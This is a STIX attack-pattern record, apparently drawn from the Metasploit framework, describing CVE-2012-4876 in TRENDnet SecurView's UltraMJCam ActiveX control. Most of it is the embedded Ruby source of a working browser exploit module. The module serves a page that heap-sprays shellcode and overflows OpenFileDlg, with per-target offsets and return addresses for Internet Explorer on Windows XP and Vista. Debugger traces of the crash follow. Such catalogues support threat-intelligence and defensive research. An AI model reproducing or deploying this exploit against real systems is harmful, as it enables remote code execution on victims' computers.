{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c2198ccf-9cd3-46d8-8485-83c66416b28a",
    "created": "2024-08-14T16:43:31.701614Z",
    "modified": "2024-08-14T16:43:31.701618Z",
    "name": "\"TRENDnet SecurView Internet Camera UltraMJCam OpenFileDlg Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in TRENDnet SecurView Internet Camera's ActiveX control.  By supplying a long string of data as the sFilter argument of the OpenFileDlg() function, it is possible to trigger a buffer overflow condition due to WideCharToMultiByte (which converts unicode back to) overwriting the stack more than it should, which results arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ultramjcam_openfiledig_bof.rb",
            "external_id": "ultramjcam_openfiledig_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4876"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"TRENDnet SecurView Internet Camera UltraMJCam OpenFileDlg Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in TRENDnet SecurView Internet\n        Camera's ActiveX control.  By supplying a long string of data as the sFilter\n        argument of the OpenFileDlg() function, it is possible to trigger a buffer\n        overflow condition due to WideCharToMultiByte (which converts unicode back to)\n        overwriting the stack more than it should, which results arbitrary code execution\n        under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod',   #Original discovery, PoC\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4876' ],\n          [ 'OSVDB', '80661' ],\n          [ 'EDB', '18675' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'         => \"seh\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Offset' => '0x600', 'Ret' => 0x30303030 } ],\n          [ 'IE 7 on Windows XP SP3', { 'Offset' => '0x600', 'Ret' => 0x30303030 } ],\n          [ 'IE 7 on Windows Vista',  { 'Offset' => '0x600', 'Ret' => 0x30303030 } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-03-28',\n      'DefaultTarget'  => 0))\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[3]  #IE 7 on Windows Vista\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    # Set payload depending on target\n    p = payload.encoded\n\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Convert the pivot addr (in decimal format) to binary,\n    # and then break it down to this printable format:\n    # \\x41\\x41\\x41\\x41\n    t = [my_target.ret].pack(\"V\").unpack(\"H*\")[0]\n    target_ret = ''\n    0.step(t.length-1, 2) do |i|\n      target_ret << \"\\\\x#{t[i, 2]}\"\n    end\n\n    js = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x40000-6)/2);\n\n    heap_obj.gc();\n\n    for (var i=1; i < 0x1000; i++) {\n      heap_obj.alloc(block);\n    }\n\n    var ret = \"\";\n    for (i2=0; i2<30000; i2++) {\n      ret = ret + \"#{target_ret}\";\n    }\n    obj.OpenFileDlg(ret);\n    JS\n\n    js = heaplib(js, {:noobfu => true})\n\n    html = <<-EOS\n    <html>\n    <head>\n    <script>\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:707ABFC2-1D27-4A10-A6E4-6BE6BDF9FB11' id='obj'></object>\n    <script>\n    #{js}\n    </script>\n    </body>\n    </html>\n    EOS\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n\n=begin\nbp 1000f952 \"r; g\"\nbp kernel32!WideCharToMultiByte \"r; dc poi(esp+c); .echo; g\"\n\neax=023f4bf4 ebx=1006519c ecx=00000003 edx=0013a170 esi=00038ce0 edi=00000000\neip=7c80a164 esp=0013a130 ebp=0013a158 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nkernel32!WideCharToMultiByte:\n7c80a164 8bff            mov     edi,edi\n023f4bf4  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.\n023f4c04  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.\n023f4c14  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.\n023f4c24  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.\n023f4c34  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.\n023f4c44  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.\n023f4c54  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.\n023f4c64  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.\n\nChildEBP RetAddr\n0013a12c 1000f958 kernel32!WideCharToMultiByte\nWARNING: Stack unwind information not available. Following frames may be wrong.\n0013a158 100211d0 UltraMJCamX+0xf958\n0013e24c 77135cd9 UltraMJCamX!DllUnregisterServer+0xeb20\n0013e26c 771362e8 OLEAUT32!DispCallFunc+0x16a\n0013e2fc 10017142 OLEAUT32!CTypeInfo2::Invoke+0x234\n0013e32c 100170e2 UltraMJCamX!DllUnregisterServer+0x4a92\n0013e358 7deac999 UltraMJCamX!DllUnregisterServer+0x4a32\n0013e398 7deacfaf mshtml!InvokeDispatchWithNoThis+0x78\n0013e3d8 7deac9fc mshtml!COleSite::ContextInvokeEx+0x149\n0013e40c 75c71408 mshtml!COleSite::ContextThunk_InvokeEx+0x44\n0013e444 75c71378 jscript!IDispatchExInvokeEx2+0xac\n0013e47c 75c76db3 jscript!IDispatchExInvokeEx+0x56\n0013e4ec 75c710d8 jscript!InvokeDispatchEx+0x78\n0013e534 75c6fab8 jscript!VAR::InvokeByName+0xba\n0013e574 75c6efea jscript!VAR::InvokeDispName+0x43\n0013e598 75c76ff4 jscript!VAR::InvokeByDispID+0xfd\n0013e650 75c7165d jscript!CScriptRuntime::Run+0x16bd\n0013e668 75c71793 jscript!ScrFncObj::Call+0x8d\n0013e6d8 75c5da62 jscript!CSession::Execute+0xa7\n0013e728 75c5e6e7 jscript!COleScript::ExecutePendingScripts+0x147\n\n0:008> r\neax=78f8f8f8 ebx=1006519c ecx=020bc038 edx=0c0c0c0c esi=020bf4d0 edi=020c0000\neip=1003a0e9 esp=020bb140 ebp=020bf22c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nUltraMJCamX!DllUnregisterServer+0x27a39:\n1003a0e9 8917            mov     dword ptr [edi],edx  ds:0023:020c0000=00905a4d\n\n\nThe only application-specific component loaded is UltraMJCamX.ocx, but this\ncan be unreliable and I'd rather not use that.\n=end\n",
    "x_mitre_disclosure_date": "2012-03-28",
    "x_mitre_platforms": [
        "win'"
    ]
}